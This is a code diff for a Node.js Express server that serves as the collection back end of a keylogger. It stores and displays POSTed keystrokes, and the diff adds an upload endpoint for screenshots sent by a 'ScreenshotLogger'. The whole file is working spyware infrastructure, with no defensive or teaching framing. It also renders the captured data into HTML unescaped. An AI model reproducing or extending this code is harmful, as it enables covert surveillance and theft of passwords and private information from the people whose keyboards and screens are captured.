@@ -1,43 +1,59 @@
-// We import the fs module so that we can have access to the file system.
 const fs = require("fs");
 const express = require("express");
 const bodyParser = require("body-parser");
+const multer = require("multer");
+const path = require("path");
 
-// Create the express app.
 const app = express();
-
-/* app should use bodyParser. For this example we'll use json. bodyParser allows you to
-access the body of your request.
-*/
-app.use(bodyParser.json({extended: true}));
-
-// We assign the port number 8080.
 const port = 8080;
 
-// When a GET request is made to the "/" resource we return basic HTML.
+// === Middleware ===
+app.use(bodyParser.json());
+
+// === Screenshot Upload Setup ===
+const storage = multer.diskStorage({
+  destination: function (req, file, cb) {
+    const dir = "./uploads";
+    if (!fs.existsSync(dir)) fs.mkdirSync(dir);
+    cb(null, dir);
+  },
+  filename: function (req, file, cb) {
+    const uniqueSuffix = Date.now() + "-" + Math.round(Math.random() * 1e9);
+    cb(null, uniqueSuffix + path.extname(file.originalname));
+  }
+});
+const upload = multer({ storage: storage });
+
+// === Routes ===
+
+// Homepage - View keylogger logs
 app.get("/", (req, res) => {
-    /* The GET request shows the data that's logged in the keyboard_capture.txt file.
-    If the file keyboard_capture.txt has not yet been created, the try catch statement will
-    throw an exception and log to the homepage that nothing's been logged yet.   
-    */ 
-    try {
-        const kl_file = fs.readFileSync("./keyboard_capture.txt", {encoding:'utf8', flag:'r'});    
-        // We send the txt file data to the server. We replace the /\n/g with <br> 
-        res.send(`<h1>Data Collected: </h1><p>${kl_file.replace(/\n/g, "<br>")}</p>`);
-    } catch {
-        res.send("<h1>Nothing logged yet.</h1>");
-    }  
+  try {
+    const kl_file = fs.readFileSync("./keyboard_capture.txt", "utf8");
+    res.send(`<h1>Data Collected:</h1><p>${kl_file.replace(/\n/g, "<br>")}</p>`);
+  } catch {
+    res.send("<h1>Nothing logged yet.</h1>");
+  }
 });
 
-
+// POST from Keylogger
 app.post("/", (req, res) => {
-    // For demo purposes we log the keyboardData sent as part of the body of the POST request to the server.
-    console.log(req.body.keyboardData);
-    // Will now write the keyboard capture to a text file.
-    fs.appendFileSync("keyboard_capture.txt", req.body.keyboardData + /\n/g);
-    res.send("Successfully set the data");
+  console.log("[KEYLOG]", req.body.keyboardData);
+  fs.appendFileSync("keyboard_capture.txt", req.body.keyboardData + "\n");
+  res.send("Keyboard data received.");
 });
-// We can see that the app is listening on which port.
+
+// POST from ScreenshotLogger
+app.post("/upload", upload.single("screenshot"), (req, res) => {
+  if (!req.file) {
+    console.log("[SCREENSHOT] No file uploaded");
+    return res.status(400).send("No file uploaded.");
+  }
+  console.log(`[SCREENSHOT] Received file: ${req.file.filename}`);
+  res.send("Screenshot uploaded successfully.");
+});
+
+// === Start Server ===
 app.listen(port, "0.0.0.0", () => {
-    console.log(`App is listening on port ${port}`);
-});
+  console.log(`✅ Server running at http://localhost:${port}`);
+})
